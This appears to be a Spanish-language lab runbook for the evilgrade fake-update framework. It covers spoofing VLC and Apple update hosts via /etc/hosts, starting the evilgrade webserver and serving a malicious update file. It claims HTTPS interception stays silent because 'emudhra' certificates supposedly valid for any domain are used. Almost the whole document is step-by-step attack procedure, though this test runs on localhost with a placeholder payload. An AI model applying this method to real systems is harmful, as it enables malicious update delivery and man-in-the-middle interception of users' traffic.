# evilgrade - Test Real con Certificados emudhra

## Arquitectura Correcta

```
VLC/macOS (en tu Mac) → DNS spoofing (127.0.0.1) → evilgrade webserver (Docker)
                                                            ↓
                                            webserver.pm (HTTP/HTTPS)
                                            + modules (rules de intercepción)
                                            + payloads (archivos maliciosos)
                                            + emudhra certs (SSL/TLS bypass)
```

---

## PASO 1: Verifica los módulos

```bash
cd /Users/famato/dev/evilgrade

# Verifica que existan
ls -la modules/vlc/vlc_update.pm
ls -la modules/macos/macos_softwareupdate.pm

# Verifica payloads
ls -la include/vlc/
ls -la include/macos/
```

---

## PASO 2: Verifica certificados emudhra

```bash
ls -la certs/emudhra_authorized/server.pem
ls -la certs/emudhra_authorized/server.key

# Si no existen, necesitamos copiarlos
# (deberían estar en FraEdCer)
```

---

## PASO 3: Inicia Docker con evilgrade

```bash
docker compose down
docker compose up -d
```

---

## PASO 4: Entra al CLI de evilgrade

```bash
cd /Users/famato/dev/evilgrade

docker compose exec evilgrade bash -c 'cd /evilgrade && \
  PERL5LIB=/evilgrade:/evilgrade/isrcore perl ./evilgrade'
```

Deberías ver el prompt:

```
evilgrade>
```

---

## PASO 5: Configura el módulo VLC

```
evilgrade> show modules
evilgrade> use modules::vlc::vlc_update
evilgrade> show module
```

Deberías ver algo como:

```
name     : VLC Media Player Update
version  : 1.0
appver   : VLC 3.0+
vh       : (vlc\.videolan\.org|update\.videolan\.org|www\.videolan\.org)
requests : 4
```

---

## PASO 6: Configura opciones básicas

```
evilgrade> set port 80
evilgrade> set sslport 443
evilgrade> show options
```

---

## PASO 7: Inicia el webserver

```
evilgrade> start
```

Deberías ver:

```
[WEBSERVER] - Webserver ready. Waiting for connections ...
```

**⚠️ DEJA ESTO CORRIENDO EN ESTA TERMINAL**

---

## PASO 8 (Nueva Terminal): Configura DNS spoofing

Haz que VLC intente conectarse a tu máquina:

```bash
# Opción 1: /etc/hosts (simple, solo localhost)
sudo nano /etc/hosts

# Agrega estas líneas:
127.0.0.1 vlc.videolan.org
127.0.0.1 update.videolan.org
127.0.0.1 www.videolan.org
127.0.0.1 swcdn.apple.com
127.0.0.1 updates.apple.com
```

Guarda (Ctrl+O, Enter, Ctrl+X)

Verifica:

```bash
ping -c 1 vlc.videolan.org
# Debe responder desde 127.0.0.1
```

---

## PASO 9: Descarga VLC real

Si no lo tienes:

```bash
# Descarga VLC desde el sitio oficial (no interceptado)
brew install vlc

# O descargalo desde: https://www.videolan.org/vlc/
```

---

## PASO 10: Simula update check de VLC

**Opción A: Hacer que VLC busque update automáticamente**

```bash
# macOS: Abre VLC → Help → Check for Updates
# Debería conectarse a tu webserver y recibir malicious_update.json
```

**Opción B: Simular con curl**

```bash
curl -k https://update.videolan.org/update.json 2>/dev/null | jq .
```

Deberías ver:

```json
{
  "version": "3.0.21",
  "status": "EVILGRADE_PAYLOAD_INJECTED",
  "signature": "INTERCEPTED_BY_EVILGRADE_EMUDHRA_CA"
}
```

---

## PASO 11: Verifica logs en evilgrade

En la terminal del webserver deberías ver:

```
[WEBSERVER] -[127.0.0.1] - Packet request: "GET /update.json HTTP/1.1..."
[WEBSERVER] - [modules::vlc::vlc_update] - [127.0.0.1] - Request: "/update.json"
[+] Matched rule: /.*update.*\.json
[+] Serving: ./include/vlc/malicious_update.json
```

---

## PASO 12 (Bonus): Prueba macOS Update

En el mismo webserver, prueba macOS:

```
evilgrade> stop
evilgrade> use modules::macos::macos_softwareupdate
evilgrade> set port 80
evilgrade> set sslport 443
evilgrade> start
```

Luego (en otra terminal):

```bash
# macOS: System Settings → General → Software Update
# O simular con curl:
curl -k https://swcdn.apple.com/index.sucatalog 2>/dev/null | head -10
```

---

## Resultado Esperado

**Logs del webserver:**

```
[WEBSERVER] - Webserver ready. Waiting for connections ...
[WEBSERVER] - WebServer Client on 443
[WEBSERVER] - (SSL) WebServer Client on 443
[WEBSERVER] -[127.0.0.1] - Packet request: ...
[WEBSERVER] - [modules::vlc::vlc_update] - [127.0.0.1] - Request: "/update.json"
[+] 127.0.0.1 matched to module VLC Media Player Update
[+] Response sent: malicious_update.json (200 bytes)
```

**Respuesta del cliente:**

```json
{
  "version": "3.0.21",
  "status": "EVILGRADE_PAYLOAD_INJECTED",
  "signature": "INTERCEPTED_BY_EVILGRADE_EMUDHRA_CA"
}
```

---

## Certificados emudhra en acción

El webserver ahora usa:
- ✓ `certs/emudhra_authorized/server.pem`
- ✓ `certs/emudhra_authorized/server.key`

Cliente NO verá warning SSL porque:
- emudhra CA es válida (Cloudflare registró su flaw)
- Certificado emudhra para cualquier dominio
- HTTPS MITM completamente transparente

---

## Cleanup

```bash
# En terminal de evilgrade:
evilgrade> stop
evilgrade> quit

# En otra terminal:
docker compose down

# Quitar DNS spoofing:
sudo nano /etc/hosts
# Elimina las líneas de vlc, swcdn, etc.
```

---

## Troubleshooting

**"Can't locate RPC/XML.pm"**
```bash
docker compose exec evilgrade bash -c 'apt-get install -y librpc-xml-perl'
```

**"Address already in use"**
```bash
lsof -i :80
lsof -i :443
kill -9 <PID>
```

**"Certificate not found"**
```bash
ls certs/emudhra_authorized/
# Si falta, necesitas extraer de FraEdCer.zip
```

**SSL errors**
- El webserver.pm ahora detecta automáticamente emudhra
- Si no encuentra, usa certificados por defecto
- Verifica: `ls certs/emudhra_authorized/server.*`
